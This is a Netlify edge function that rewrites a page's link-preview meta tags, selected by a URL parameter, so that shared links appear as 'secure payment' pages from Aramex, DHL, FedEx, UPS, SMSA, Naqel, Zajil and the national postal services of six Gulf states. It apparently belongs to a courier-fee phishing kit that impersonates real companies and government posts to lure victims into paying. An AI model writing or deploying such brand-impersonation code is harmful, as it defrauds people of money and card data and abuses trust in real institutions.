import { Context } from "https://edge.netlify.com";

const companyMeta: Record<string, { title: string; description: string; image: string }> = {
  aramex: {
    title: "دفع آمن - أرامكس للشحن السريع",
    description: "خدمات شحن عالمية مع أرامكس - أكمل عملية الدفع بأمان تام للحصول على خدمات شحن سريعة وموثوقة",
    image: "/og-aramex.jpg"
  },
  dhl: {
    title: "دفع آمن - DHL الشحن العالمي السريع",
    description: "DHL - الشبكة العالمية الأكبر للشحن السريع - أكمل دفعتك بأمان للحصول على خدمات توصيل سريعة وموثوقة",
    image: "/og-dhl.jpg"
  },
  fedex: {
    title: "دفع آمن - FedEx الشحن الدولي الموثوق",
    description: "FedEx - رائدة الشحن الدولي - ادفع بأمان واحصل على خدمات شحن موثوقة مع تتبع فوري وضمان الوصول",
    image: "/og-fedex.jpg"
  },
  ups: {
    title: "دفع آمن - UPS للشحن والتوصيل العالمي",
    description: "UPS - حلول لوجستية متكاملة - أكمل الدفع بأمان للحصول على خدمات شحن عالمية احترافية",
    image: "/og-ups.jpg"
  },
  smsa: {
    title: "دفع آمن - SMSA Express سمسا إكسبرس",
    description: "SMSA Express - الرائدة في الشحن السعودي - أكمل الدفع بأمان للحصول على خدمات توصيل سريعة",
    image: "/og-smsa.jpg"
  },
  naqel: {
    title: "دفع آمن - ناقل إكسبريس للشحن",
    description: "ناقل إكسبريس - خدمات شحن متطورة - أكمل دفعتك بأمان للحصول على توصيل سريع وآمن",
    image: "/og-naqel.jpg"
  },
  zajil: {
    title: "دفع آمن - زاجل للشحن السريع",
    description: "زاجل - شحن سريع وموثوق في السعودية - ادفع بأمان واحصل على خدمات توصيل احترافية",
    image: "/og-zajil.jpg"
  },
  saudipost: {
    title: "دفع آمن - البريد السعودي",
    description: "البريد السعودي الرسمي - خدمات بريدية وشحن موثوقة - ادفع بأمان واستفد من شبكة التوزيع",
    image: "/og-saudipost.jpg"
  },
  empost: {
    title: "دفع آمن - البريد الإماراتي",
    description: "البريد الإماراتي الرسمي - خدمات بريدية وشحن متميزة - ادفع بأمان واستمتع بخدمات الشحن",
    image: "/og-empost.jpg"
  },
  qpost: {
    title: "دفع آمن - البريد القطري",
    description: "البريد القطري الرسمي - خدمات بريدية وشحن احترافية - ادفع بأمان واستمتع بخدمات توصيل سريعة",
    image: "/og-qpost.jpg"
  },
  kwpost: {
    title: "دفع آمن - البريد الكويتي",
    description: "البريد الكويتي الرسمي - خدمات بريدية وشحن متميزة - أكمل الدفع بأمان للحصول على خدمات توصيل",
    image: "/og-kwpost.jpg"
  },
  omanpost: {
    title: "دفع آمن - البريد العُماني",
    description: "البريد العُماني الرسمي - خدمات بريدية وشحن موثوقة - أكمل دفعتك بأمان للحصول على خدمات توصيل",
    image: "/og-omanpost.jpg"
  },
  bahpost: {
    title: "دفع آمن - البريد البحريني",
    description: "البريد البحريني الرسمي - خدمات بريدية وشحن احترافية - ادفع بأمان واحصل على خدمات توصيل سريعة",
    image: "/og-bahpost.jpg"
  },
  default: {
    title: "منصة الدفع الذكية - خدمات دفع آمنة لدول الخليج",
    description: "منصة متكاملة لخدمات الدفع الإلكتروني في دول الخليج - شحن، فواتير، عقود، خدمات حكومية وصحية",
    image: "/og-aramex.jpg"
  }
};

export default async (request: Request, context: Context) => {
  const url = new URL(request.url);
  
  const companyParam = url.searchParams.get("company") || url.searchParams.get("service");
  if (!companyParam) {
    return context.next();
  }

  const response = await context.next();
  let html = await response.text();

  const meta = companyMeta[companyParam.toLowerCase()] || companyMeta.default;
  const origin = url.origin;
  const imageUrl = `${origin}${meta.image}`;

  html = html.replace(
    /<meta property="og:title" content="[^"]*"/,
    `<meta property="og:title" content="${meta.title}"`
  );
  html = html.replace(
    /<meta property="og:description" content="[^"]*"/,
    `<meta property="og:description" content="${meta.description}"`
  );
  html = html.replace(
    /<meta property="og:image" content="[^"]*"/g,
    `<meta property="og:image" content="${imageUrl}"`
  );
  html = html.replace(
    /<meta property="og:image:secure_url" content="[^"]*"/,
    `<meta property="og:image:secure_url" content="${imageUrl}"`
  );
  html = html.replace(
    /<meta property="og:url" content="[^"]*"/,
    `<meta property="og:url" content="${url.href}"`
  );
  html = html.replace(
    /<meta name="twitter:image" content="[^"]*"/,
    `<meta name="twitter:image" content="${imageUrl}"`
  );
  html = html.replace(
    /<meta name="twitter:title" content="[^"]*"/,
    `<meta name="twitter:title" content="${meta.title}"`
  );
  html = html.replace(
    /<meta name="twitter:description" content="[^"]*"/,
    `<meta name="twitter:description" content="${meta.description}"`
  );

  return new Response(html, {
    headers: {
      "content-type": "text/html; charset=utf-8",
      "cache-control": "public, max-age=0, must-revalidate"
    }
  });
};

export const config = { path: ["/*"] };
